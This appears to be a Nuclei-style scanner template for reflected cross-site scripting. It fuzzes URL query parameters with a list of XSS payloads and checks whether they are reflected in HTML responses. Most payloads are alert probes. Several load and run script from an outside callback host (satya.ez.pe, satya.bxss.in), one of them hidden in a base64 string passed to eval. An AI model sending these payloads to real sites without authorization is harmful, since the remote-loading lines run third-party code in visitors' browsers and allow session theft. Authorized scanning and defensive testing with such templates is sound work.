id: reflected-xss

info:
  name: Reflected Cross Site Scripting
  author: pdteam
  severity: medium
  tags: xss,rxss,dast

variables:
  first: "{{rand_int(10000, 99999)}}"
  
http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      reflection:
        - "'\"><{{first}}"
        - "<img src=x onerror=alert({{first}})>"
        - "<script>alert({{first}})</script>"
        - "'><ScRiPt>alert({{first}})</sCrIpT>"
        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
        - "</script><script>alert({{first}})</script>"
        - "<body onload=alert({{first}})>"
        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
        - "\u0022\u003c%26quot;%26gt;%26lt;\"';}};â€œ></SCRIPT><img src=x onerror=alert({{first}})>${{7*7}}"
        - "</script><script src='https://satya.ez.pe'></script>"
        - "<script src=//satya.ez.pe></script>"
        - ""><script src=https://satya.bxss.in></script>"
        - "javascript:eval('var a=document.createElement('script');a.src='https://satya.bxss.in';document.body.appendChild(a)')"
        - ""><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2F0eWEuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61; autofocus>"
        - "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//satya.bxss.in");a.send();</script>"
        - "<script>$.getScript("//satya.bxss.in")</script>"

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{reflection}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"
